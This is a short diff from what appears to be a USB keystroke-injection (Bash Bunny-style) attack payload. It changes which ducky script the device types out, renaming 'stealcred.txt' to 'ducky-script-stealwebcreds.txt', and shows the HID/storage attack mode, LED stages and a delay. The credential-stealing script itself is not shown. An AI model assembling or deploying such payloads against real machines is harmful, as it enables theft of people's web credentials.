@@ -14,7 +14,7 @@ ATTACKMODE HID STORAGE
 
 # Based on the position run the ducky script 
 LED STAGE1
-QUACK ${SWITCH_POSITION}/stealcred.txt
+QUACK ${SWITCH_POSITION}/ducky-script-stealwebcreds.txt
 QUACK DELAY 15000
 
 LED FINISH
